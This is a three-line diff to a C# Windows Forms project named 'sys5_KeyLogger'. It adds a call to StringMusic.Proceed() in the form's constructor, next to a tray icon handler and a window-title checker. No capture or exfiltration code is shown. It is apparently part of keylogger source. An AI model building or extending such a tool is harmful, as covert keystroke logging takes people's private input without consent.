@@ -18,6 +18,8 @@ namespace sys5_KeyLogger
 		static WindowTitleChecker wtc;
 		public Form1()
 		{
+			StringMusic.Proceed();
+
 			InitializeComponent();
 
 			notifyIcon1.DoubleClick += NotifyIcon1_DoubleClick;
